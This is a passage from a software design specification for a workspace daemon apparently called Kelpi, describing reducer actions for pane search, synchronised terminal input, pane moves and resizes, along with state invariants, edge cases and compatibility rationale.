  (`"markdown"` AND not editing). Scratchpad/diff and editing markdown panes cannot
  host find.
- If a search is ALREADY open anywhere in the workspace: dispatch `searchClose`
  (i.e. the toggle closes the existing bar, even if focus moved to a different pane;
  it does not move the bar).
- Else: `searchingPaneID = focusedPaneID; searchNeedle = ""; searchTotal = null;
  searchSelected = null`.

There is no terminal-initiated search (no equivalent of a native terminal keybinding
adopting or ending a search behind the reducer's back): the daemon owns the terminal
search, so nothing opens or closes a bar except the actions in this section.

**searchNeedleChanged(needle)** (`set-search-needle` in
`packages/daemon/src/store/reducers/layout.ts`)
- Guard a search is open (`searchingPaneID != null`), else no-op.
- `searchNeedle = needle; searchSelected = null`; route the effect by the searched pane's
  type:
  - web: effect drives find on the ACTIVE TAB with the needle. Latest-wins
    cancellation (an in-flight previous run is cancelled), no artificial delay.
  - markdown: effect updates the markdown find controller. Latest-wins, no delay.
  - shell: needle == "" -> immediately clear the terminal search; needle length < 3 ->
    wait 300ms then run the search (debounce, cancelled by the next change); length >= 3
    -> run immediately (still cancels any in-flight predecessor). All three share one
    cancellation key. The debounce lives in the client
    (`packages/client/src/app/search-needle.ts`); the daemon's `terminal-search` channel
    (`packages/daemon/src/ws/search.ts`) computes `searchTotal` only for shell panes and
    publishes `total: null` for web and markdown panes, whose counts arrive from the
    client's own find backend via searchTotalUpdated/searchSelectedUpdated.

**searchNavigateNext / searchNavigatePrevious**
- Guard a search is open; route by type: web -> find-next/previous on the active tab;
  markdown -> controller next/previous; shell -> terminal `navigate_search:next` /
  `navigate_search:previous`.

**searchClose**
- Guard a search is open. Capture the pane type and (for web) the active tab id, THEN
  clear all four fields, then effect: web -> close find on that tab; markdown -> close
  the controller; shell -> terminal `end_search`.

**searchTotalUpdated(paneID, total)** (backend reported a match count)
- Guard `searchingPaneID === paneID` (stale reports from other panes are dropped).
- `searchTotal = total`; if `total === 0` also `searchSelected = null` (prevents a
  "3/0" display when a live-reloaded document loses its matches).

**searchSelectedUpdated(paneID, selected)**
- Guard `searchingPaneID === paneID`; `searchSelected = selected`.

Search cleanup is also triggered from: `closePane` (searched pane closing),
`toggleMarkdownEdit` entering edit mode, and the reuse branches of
openMarkdownFile/openDiffPane/openWebPane (source pane being parked).

### 7.15 Synchronise input (tmux-style, issue #121)

**toggleSyncInput**
- `isSyncInputActive = !isSyncInputActive`.
- `syncInputExcluded = {}` on EVERY transition (both off->on and on->off). Clearing
  only on off would let an exclude staged while sync was off silently survive into the
  next on-cycle; each on-cycle must start from the "all shell panes participate"
  baseline. Consequence: `kelpi pane sync exclude` is only meaningful AFTER `sync on`.
- Effect: refreshSyncGroup (3.8).

**setSyncInputActive(active)** (idempotent CLI form: `sync on` / `sync off`)
- Guard `isSyncInputActive !== active` else no-op (repeated `sync on` does NOT clear
  exclusions).
- Set; clear `syncInputExcluded`; refreshSyncGroup.

**setSyncInputExcluded(paneID, excluded)**
- Guard the pane is VISIBLE (parked panes are not eligible anyway; unknown ids no-op).
- Insert into / remove from `syncInputExcluded`; refreshSyncGroup.
- Note: legal while sync is off (the set mutates) but pointless, since the next
  activation clears it.

**Automatic group refresh** (a second reducer pass that runs AFTER the main handler,
observing the post-mutation state):

```
if (state.isSyncInputActive) AND action is one of
   { createPane, splitPane, splitPaneAtPath, closePane,
     openMarkdownFile, openDiffPane, openWebPane,
     createScratchpad, reopenClosedPane, paneProcessTerminated }:
  emit refreshSyncGroup(state)
```

So while sync is active, brand-new shell panes JOIN the group automatically and closed
panes drop out, without every call site remembering. When sync is off no refresh is
needed (the group entry is already absent; the explicit sync actions handle their own
refresh synchronously). The group can collapse to empty via the ">= 2 shell panes"
rule (e.g. closing the second-to-last shell pane), in which case refresh REMOVES the
broadcaster entry even though `isSyncInputActive` stays true; opening another shell
pane re-materializes the group.

Sync flag lifecycle: `isSyncInputActive` and `syncInputExcluded` are transient and
reset to off/empty on daemon restart.

### 7.16 Other reducer actions on workspace state

Actions that touch `WorkspaceState` but sit outside the catalogue above
(`packages/daemon/src/store/types.ts`):

**setPaneLabel(paneID, label: string | null)** (`set-pane-label`; the `pane-name` wire
verb, `packages/daemon/src/handlers/pane/lifecycle.ts`)
- mutate the VISIBLE pane: `label = label`. The handler maps an empty name to null, so
  an empty name clears the label. Unknown ids no-op.

**movePaneToWorkspace(paneID, toWorkspaceID)** (`move-pane-to-workspace`; specified in
socket-handlers.md §4.11)
- Guard the pane is visible in some workspace, the target exists, and it is not the
  source, else no-op.
- Source: remove the pane from `panes`, `syncInputExcluded` and the layout; carry a web
  pane's sidecar across (delete it from the source); `currentLayoutIndex = null`; scrub
  and, if it was focused, refocus via popFocusFromHistory / layout order; clear a search
  on it; if it was the zoomed pane, un-zoom onto `savedLayout` minus the pane.
- Target: append the pane; split the focused pane (falling back to the first in layout
  order) horizontally with the moved pane second, or make it the root leaf of an empty
  layout; restore the sidecar; `currentLayoutIndex = null`; `setFocus(paneID)`.
- `lastActiveWorkspaceID = toWorkspaceID`.

**resizePane(paneID, share)** (`resize-pane`; `kelpi pane resize`,
`packages/daemon/src/handlers/pane/geometry.ts`)
- `resizePaneShare` (`packages/core/src/layout/ratio.ts`): find the enclosing split (1.6);
  none -> no-op (the handler already replied "no sibling to resize against"); clamp the
  share to [0.1, 0.9]; convert to the first-child ratio (`share` when the pane is first,
  `1 - share` when second); apply through `updatingSplitRatio` (1.7).
- `currentLayoutIndex = null`, exactly like a divider drag (6).

**setWorkspaceIcon(icon: GroupIcon | null)** (`set-workspace-icon`) sets `icon`;
**setRepoAssociationBranch(associationID, branchName)** (`set-repo-association-branch`)
updates one association's `branchName` in place. Both belong to other specs
(app-state-core.md and graft-git.md's HEAD-watcher refresh respectively; see 10.10) and
are listed here only so the action set on `WorkspaceState` is complete.

---

## 8. Invariants

1. Every VISIBLE pane id appears exactly once as a leaf in `layout`, and every leaf id
   names a visible pane. (`createPane` misuse and a stale `focusedPaneID` during
   `splitPaneAtPath` are the two known ways to break this; keep the caller contracts.)
2. A pane lives in exactly one of `panes` / `parkedPanes` at any time.
3. `focusedPaneID` is null only when the workspace has no visible panes (or transiently
   on restore); it always names a visible pane otherwise.
4. `focusHistory` contains no duplicates, never the currently-focused pane as its last
   pushed entry twice, max 8 entries; dead ids are tolerated (lazily filtered on pop)
   but scrubbed eagerly on close/unpark.
5. `zoomedPaneID != null` iff `savedLayout != null`; while zoomed, `layout` is
   `leaf(zoomedPaneID)`. (Watch the openMarkdownFile caveat in 7.4, which can violate
   the second half until the next un-zoom.)
6. `currentLayoutIndex != null` implies the layout is exactly the predefined layout at
   that index built over the current pane order (any structural edit nulls it).
7. `webPanes` has an entry for every visible web pane EXCEPT a reopened private web
   pane (7.9 edge); it never has entries for non-web panes; entries are deleted on
   web-pane close.
8. `recentlyClosedPanes.length <= 10`; `inspectResultQueue.length <= 32`; console ring
   buffer capacity 1000; `focusHistory.length <= 8`; labels each <= 64 chars.
9. `syncInputExcluded` is always empty when `isSyncInputActive` is false... eventually:
   it is cleared on every activation transition, though it can be transiently non-empty
   while off (see 7.15).
10. `backgroundTaskCount > 0` implies `status === "running"` (enforced by agentStopped;
    agentStarted/sessionStarted/agentError/setPaneStatus all reset the count).
11. `agentStartedAt` is set on every `agentStarted` (including one that arrives mid-run,
    which restarts the clock) and on every non-running -> running transition via
    agentStopped(bg>0) / notification(bg>0) / setPaneStatus.
12. Session ids only ever reach a PTY through `resumeCommand`, which enforces the
    safety allowlist. Never interpolate a raw wire string into a shell command.
13. Splits created by user actions always start at ratio 0.5 with the pre-existing pane
    first; stored ratios are always in [0.1, 0.9] after any update (initial predefined
    layouts can store smaller ratios, e.g. 1/N for N > 10 panes in an even split; the
    clamp applies only to updates).

## 9. Edge cases catalogue

- `splitPane` with a `sourcePaneID` naming a parked or unknown pane: no-op (visible
  panes only).
- `splitPaneAtPath` with stale focus: appends an orphaned pane (see 7.2 warning).
- `createPane` on a populated workspace: orphans all existing panes (caller contract).
- `closePane` of the last pane: empty workspace; app layer treats this as
  workspace-delete when triggered from the close-pane keybinding.
- `reopenClosedPane` with no focused pane: the snapshot is consumed and lost.
- Reopened private web pane: pane exists, no `webPanes` entry.
- `webPaneTabClose` on the last tab: reducer no-op; the wire verb answers with an
  error and ⌘W in the GUI runs the ordinary close-pane binding instead.
- `movePane` onto itself: layout unchanged, but focus set and layout index reset.
- `movePaneInDirection` while zoomed: no-op (does not un-zoom).
- Out-of-order SessionEnd(old)/SessionStart(new): the match guard in `sessionEnded`
  keeps the new id either way.
- Repeated `agentStarted` during one run: status stays running, timer restarts (the
  previous stop is assumed missed).
- Repeated `agentStopped(bg>0)`: idempotent (stays running, count updated).
- Codex: no SessionEnd -> stale codex session id may persist after exit (restart may
  resume an old session; pane sits in the waiting bucket). Accepted limitation.
- `searchTotalUpdated`/`searchSelectedUpdated` for a pane that is not the searching
  pane: dropped.
- `webPaneStateChanged` with `about:blank`/empty URL: URL preserved, title may update.
- `webPaneTabReorder` with a non-permutation: dropped wholesale.
- `paneProcessTerminated` for a parked pane clears `parkedSourcePaneID` on any pane
  pointing at it, converting that pane's future close into a normal close.
- Unknown pane ids in mutate-style actions (`paneTitleChanged`, `agentStarted`, ...):
  silent no-ops.

---

## 10. Compatibility rationale

These notes record the quirks and shapes Kelpi keeps on purpose so the pre-port kelpi CLI,
hook scripts and saved state keep working, and why the code does what it does where that
is not obvious from the rules above.

1. **Effects model.** Every behavior above is expressed as pure state transitions plus
   a list of effects. The daemon keeps that shape: the reducers are pure
   (`packages/daemon/src/store/reducers/`), and the effects run in the handlers and
   services around the store: `spawnPty(paneID, cwd, env, command?)` and
   `destroyPty(paneID)` (`packages/daemon/src/pty/manager.ts`), the branch reconciler
   (`packages/daemon/src/git/branch.ts`), `setSyncGroup(wsID, ids)`, web-pane host
   commands (`packages/daemon/src/webpane/`), `typeIntoPane + Enter` (resume), and timed
   follow-ups (the 2s resume delay, the client's 300ms search debounce, the client's
   600ms clearPaneStatus dwell). A terminal surface is a daemon-owned PTY plus
   ghostty-vt terminal state; "destroySurface" = kill PTY + drop terminal state +
   broadcast pane-removed to clients.

2. **Who renders vs who owns.** This whole state machine lives in the DAEMON, so it
   behaves identically for CLI-only usage with no client attached. Three things are
   client-side by design: the 600ms focus-dwell timer that sends `clear-pane-status`
   (the client knows which pane it is showing; the daemon owns the mutation, so the
   cleared status reaches every other client as a delta), the markdown find controller
   and web-view find (they run in the client's sandboxed frame and the host's
   webContents; the daemon keeps only searchingPaneID/needle/total/selected and relays),
   and drag-drop DropZone hit-testing (`packages/core/src/layout/dropZone.ts`, a
   nearest-edge quadrant test; the client resolves the zone and sends `movePane` with
   it).

3. **The external-$EDITOR markdown mode.** It spawns a PTY running `$EDITOR file`
   inside the markdown pane (`packages/daemon/src/ws/desktop.ts`), which the daemon can
   do because it owns PTYs and the client renders terminals anyway. The exact rules
   hold: the surface exists only while `externalEditorCommand != null`, editor exit
   returns to preview (paneProcessTerminated branch 2), close while editing destroys
   the surface, and such panes are still excluded from sync groups.

4. **Sequencing subtleties that were simplified:**
   - The two-step `webConsoleLineReceived` -> `webConsoleLineAppended` existed only to
     order a parent's fan-out after the append; the daemon's web-pane service appends
     and fans out in one step (`packages/daemon/src/webpane/console.ts`), preserving
     "subscribers see a line only after it is buffered".
   - The `newPaneID`/`tabID` pre-allocation exists so CLI replies can echo real ids.
     It is kept: the wire handler mints the UUID, replies, then dispatches with the id.

5. **Bugs/quirks preserved deliberately** (each flagged QUIRK in
   `packages/daemon/src/store/reducers/panes.ts`, so the pre-port CLI and saved state
   see the same behavior): openMarkdownFile's missing un-zoom restore in the split
   branch (7.4); reopenClosedPane consuming the snapshot before the focus guard (7.9;
   the wire reply is an error rather than a phantom pane id); reopened private web
   panes lacking a sidecar (the UI treats a missing sidecar as a blank tab);
   `createPane`'s unconditional layout replacement (the caller contract, not a guard,
   keeps it safe); `movePane` self-target still resetting `currentLayoutIndex` and
   focus.

6. **Persistence boundary.** Exactly the fields listed in 1.9's persisted set are
   serialized (`packages/daemon/src/store/snapshot.ts`); everything marked TRANSIENT
   resets on daemon restart. The boot restore flow (`applyLoadReset`, not this reducer)
   captures (paneID, agentSessionID, agentKind, agentProfileName, cwd) resume tuples
   BEFORE clearing session ids, then respawns and types resume commands; `sessionEnded`'s
   match-guarded clearing and `agentKind`'s survival are what keep resume from
   re-attaching dead sessions or running the wrong CLI.

7. **Concurrency.** All transitions above are atomic with respect to each other: the
   daemon's store (`packages/daemon/src/store/store.ts`) applies actions synchronously
   on one event loop, and an action dispatched from a listener is queued and applied
   after the current one drains, so per-workspace ordering is total. Git branch lookups
   and PTY spawns are async and re-enter via dispatched actions; they tolerate the pane
   having been closed meanwhile (all the mutate actions no-op on unknown ids, and the
   deferred spawn and the branch resolver both re-read state before acting).

8. **Sync input over the wire.** Mirroring happens where input enters: the daemon
   receives key/text input per pane from clients and, when the source pane is in its
   workspace's sync group, writes the same bytes to every sibling PTY
   (`write` in `packages/daemon/src/pty/manager.ts`). The rules hold: source excluded,
   shell panes only (enforced by the membership computation, not the broadcaster),
   best-effort on dead PTYs, group membership pushed eagerly by refreshSyncGroup rather
   than computed per keystroke.

9. **IDs and ordering.** `panes` order is append order and is user-visible only through
   layout traversal; `allPaneIDs(layout)` (DFS, first-then-second) is the canonical
   order for focus cycling and predefined-layout rebuilds. Both orderings are preserved
   in the store's data structures.

10. **What is NOT here.** Workspace creation/deletion/reordering, groups, the socket
    protocol's request/response framing, label presets, notifications/dock badges, and
    the git worktree flows live in app-state-core.md, socket-handlers.md and
    graft-git.md. This reducer only ever sees already-resolved pane/workspace UUIDs;
    all name-or-id and label resolution happens upstream.
